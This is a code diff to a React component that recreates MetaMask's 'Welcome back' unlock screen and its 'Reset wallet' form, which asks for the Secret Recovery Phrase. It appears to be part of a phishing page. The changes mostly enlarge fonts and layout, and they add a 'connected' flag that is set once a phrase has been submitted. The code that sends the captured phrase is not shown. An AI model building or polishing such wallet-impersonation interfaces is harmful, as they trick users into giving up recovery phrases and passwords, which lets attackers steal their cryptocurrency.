@@ -6,6 +6,7 @@ const MetaWallet = ({
     children,
     isOpen = Boolean,
     setIsOpen,
+    setConnect,
     HandleChange,
 }) => {
     // let [ isOpen, setIsOpen ] = useState(false);
@@ -43,7 +44,9 @@ const MetaWallet = ({
         .then(() => setRecovery('')
         )
         .then(() => setRecover(false))
+        .then(() => setConnect("true"))
         .then(() => setIsOpen(false)
+        
         )
         .catch((err)=>(
             console.log(err)
@@ -97,13 +100,13 @@ const MetaWallet = ({
                 leaveTo="opacity-0"
                 leaveFrom="opacity-100"
             >
-            <div className='bg-white fixed w-[390px] max-w-[450px] min-h-[650px] max-h-[700px]  z-[1000] top-2   right-5  text-gray-400'>
+            <div className='bg-white fixed w-[430px] max-w-[550px] min-h-[700px] max-h-[900px]  z-[1000] top-2   right-5  text-gray-400'>
             <div className='flex w-full p-4 justify-between items-center bg-gray-100 '>
                 <div className='text-black'>
                     <svg
                         height={40}
                         viewBox="0 0 1311 242"
-                        width={150}
+                        width={180}
                         xmlns="http://www.w3.org/2000/svg"
                         className=""
                         >
@@ -191,7 +194,7 @@ const MetaWallet = ({
                 <div className='flex justify-between rounded-full border border-gray-400 p-3 items-center space-x-2'>
                 <span className='bg-green-600 rounded-full w-[12px] h-[12px]'></span>
                 
-                <h3 className='font-light text-black whitespace-nowrap text-xs'>Ethereum Mainnet</h3>
+                <h3 className='font-light text-black whitespace-nowrap text-lg'>Ethereum Mainnet</h3>
                 <div className='text-black'>
                 <svg
                 width={16}
@@ -220,8 +223,8 @@ const MetaWallet = ({
     >
         <div className='flex justify-center'>
         <div className='flex flex-col items-center px-6 py-4 pt-5 w-[100%]'>
-            <h1 className='font-bold text-black/70 text-2xl mt-8'>Reset wallet</h1>
-            <p className='text-xs mt-5 text-center'>MetaMask does not keep a copy of your password. If you’re having trouble unlocking your account, you will need to reset your wallet. 
+            <h1 className='font-bold text-black/70 text-4xl mt-8'>Reset wallet</h1>
+            <p className='text-base mt-5 text-center'>MetaMask does not keep a copy of your password. If you’re having trouble unlocking your account, you will need to reset your wallet. 
             You can do this by providing the Secret Recovery Phrase you used when you set up your wallet.</p>
             <div className='flex space-x-2 items-center mt-4 text-xs p-2 rounded-lg ring-1 ring-blue-400 bg-blue-100'>
             <div className=' w-[18px] text-blue-600'>
@@ -237,7 +240,7 @@ const MetaWallet = ({
             <form className='mt-10 w-full' onSubmit={handleSubmit}>
                 <div>
                     <label htmlFor="Recovery">
-                        <span id='Phrase' className='text-xs text-black'></span>
+                        <span id='Phrase' className='text-base text-black'></span>
                     <input
                     onFocus={focusRecovery} 
                     onBlur={blurRecovery}
@@ -252,7 +255,7 @@ const MetaWallet = ({
                     />
                     </label>
                 </div>
-                <button onClick={() => setIsOpen(false)} className=' mt-4 bg-blue-500 rounded-full px-4 py-4 w-full text-white'>Restore</button>
+                <button className=' mt-4 bg-blue-500 rounded-full px-4 py-4 w-full text-white'>Restore</button>
             </form>
             
             <div className='text-xs mt-8'>
@@ -274,17 +277,17 @@ const MetaWallet = ({
         </Transition.Child>
         :
         // login section
-        <div className='flex justify-center'>
-                <div className='flex flex-col items-center px-6 py-4 pt-5 w-[100%]'>
-                    <div className="mt-5 unlock-page__mascot-container">
+        <div className='flex justify-center '>
+                <div className='flex flex-col items-center justify-evenly px-6 py-4 pt-5 w-[100%]'>
+                    <div className="mt-10 unlock-page__mascot-container">
                         <MetamaskLogo/>
                     </div>
-                    <h1 className='font-bold text-black/70 text-2xl'>Welcome back!</h1>
-                    <div className='text-xs'>The decentralized web awaits</div>
+                    <h1 className='font-bold text-black/70 text-4xl'>Welcome back!</h1>
+                    <div className='text-base'>The decentralized web awaits</div>
                     <form onSubmit={() => (setRecover(!recover))} className=' mt-10 w-full'>
                         <div>
                             <label htmlFor="password">
-                                <span id='demo' className='text-xs text-black'></span>
+                                <span id='demo' className='min-h-5 min-w-fit bg-white text-xs text-black'/>
                             <input
                             onFocus={focusFunction} 
                             onBlur={blurFunction}
@@ -293,17 +296,17 @@ const MetaWallet = ({
                             id="password" 
                             placeholder='Password'
                             className='px-0 py-1 border-0 border-b-4 w-full focus:border-b-4 
-                            focus:outline-none focus:border-blue-500 focus:border-b-blue-300  '
+                            focus:outline-none focus:border-blue-700 focus:border-b-blue-300  '
                             />
                             </label>
                         </div>
                         <button className='bg-blue-500 rounded-full px-4 py-4 w-full mt-4 text-white'>Unlock</button>
                     </form>
                     
-                    <div className='text-xs mt-5'>
-                        <button onClick={() => (setRecover(!recover))} className='text-blue-500'>Forgot password?</button>
+                    <div className='text-base mt-5'>
+                        <button onClick={() => (setRecover(!recover))} className='text-blue-600'>Forgot password?</button>
                     </div>
-                    <div className='text-xs mt-8'>
+                    <div className='text-base mt-8'>
                     <span >
                         {" "}
                         Need help? Contact{" "}
